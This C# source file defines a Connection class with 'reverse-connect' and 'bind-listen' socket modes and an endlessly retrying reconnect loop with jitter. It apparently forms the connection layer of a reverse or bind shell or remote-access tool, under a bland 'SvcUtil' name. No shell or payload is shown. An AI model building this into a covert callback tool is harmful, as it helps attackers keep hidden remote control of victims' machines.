using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SvcUtil
{
    internal static class Connection
    {
        private static readonly Random Rng = new Random();

        /// <summary>
        /// Reverse-connect mode: connect out to the specified host:port.
        /// Returns the connected socket, or null on failure.
        /// </summary>
        public static Socket ConnectReverse(string host, int port)
        {
            try
            {
                IPAddress ip;
                if (!IPAddress.TryParse(host, out ip))
                {
                    // Attempt DNS resolution
                    var entry = Dns.GetHostEntry(host);
                    if (entry.AddressList.Length == 0) return null;
                    ip = entry.AddressList[0];
                }

                var ep = new IPEndPoint(ip, port);
                var sock = new Socket(ip.AddressFamily,
                                      SocketType.Stream,
                                      ProtocolType.Tcp);
                sock.Connect(ep);
                return sock;
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Bind-listen mode: listen on a local port and accept one client.
        /// Blocks until a connection arrives.
        /// Returns the accepted client socket, or null on failure.
        /// </summary>
        public static Socket Listen(int port)
        {
            Socket listener = null;
            try
            {
                listener = new Socket(AddressFamily.InterNetwork,
                                      SocketType.Stream,
                                      ProtocolType.Tcp);
                listener.SetSocketOption(SocketOptionLevel.Socket,
                                         SocketOptionName.ReuseAddress, true);
                listener.Bind(new IPEndPoint(IPAddress.Any, port));
                listener.Listen(1);
                Socket client = listener.Accept();
                return client;
            }
            catch
            {
                return null;
            }
            finally
            {
                try { if (listener != null) listener.Close(); } catch { }
            }
        }

        /// <summary>
        /// Reverse-connect with exponential backoff + jitter.
        /// Retries until connected or maxAttempts is reached (0 = infinite).
        /// </summary>
        public static Socket ConnectWithRetry(string host, int port,
                                               int maxAttempts = 0)
        {
            int attempt = 0;
            int delay = Config.ReconnectBaseDelayMs;

            while (maxAttempts == 0 || attempt < maxAttempts)
            {
                attempt++;
                Socket sock = ConnectReverse(host, port);
                if (sock != null) return sock;

                int jitter = Rng.Next(0, Config.ReconnectJitterMs);
                Thread.Sleep(delay + jitter);

                // Exponential backoff capped at max
                delay = Math.Min(delay * 2, Config.ReconnectMaxDelayMs);
            }
            return null;
        }
    }
}
